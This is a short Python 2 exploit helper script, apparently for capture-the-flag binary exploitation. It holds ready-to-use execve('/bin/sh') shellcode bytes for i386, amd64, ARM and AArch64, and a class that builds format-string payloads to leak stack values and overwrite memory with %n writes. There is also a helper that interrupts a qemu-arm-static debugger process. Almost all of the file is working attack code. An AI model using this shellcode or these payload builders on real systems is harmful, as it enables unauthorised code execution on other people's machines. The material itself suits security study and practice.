#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import sys
import time

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def sigint_handler(signum, stack):
    dbg_pid = int(myexec("ps -A | grep 'qemu-arm-static'|awk '{print $1}'").strip())
    myexec("bash -c 'kill -SIGINT %d'" % dbg_pid)

def sc(arch):
    if arch == "i386":
        # shellcraft.i386.linux.sh(), null free, 22 bytes
        return "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0b\x58\x99\xcd\x80"
    elif arch == "amd64":
        # shellcraft.amd64.linux.sh(), null free, 24 bytes
        return "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"
    elif arch == "arm":
        # null free, 27 bytes
        return "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
    elif arch == "aarch64":
        # 4 null bytes, total 35 bytes
        return "\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68"
    else:
        return None

class FmtStr:
    tbl = { 1:"hhn", 2:"hn", 4:"n", 8:"lln" }

    def __init__(self, payload="", printed=0):
        """
        payload: payload string
        printed: number of already printed bytes
        """
        self.new(payload, printed)
    
    def __str__(self):
        return self.payload

    def new(self, payload="", printed=0):
        self.payload = payload
        self.printed = printed

    def pad(self, sz, ch='A'):
        """
        padding to length sz
        """
        self.payload = self.payload.ljust(sz, ch)
        
    def raw(self, s):
        """
        append raw data to payload
        """
        self.payload += s

    def scan(self, cnt, start=1):
        """
        construct fmt payload for scanning ( using %[index]$p)
        """
        return '.'.join( "%"+str(i)+"$p" for i in xrange(start,start+cnt))

    def write(self, data, index, byte, add_printed=0):
        """
        construct fmt payload for writing
        data: data to write
        index: stack position ( %[index]$hhn )
        byte: how many bytes to write
        add_printed: this will be added to self.printed
        """
        pos = "" if not index else str(index)+"$"
        self.printed += add_printed
        num = data - self.printed
        while(num <= 0):
            num += 256**byte
        self.printed = data
        self.payload += "%" + str(num) + "c"
        self.payload += "%" + pos + self.tbl[byte]
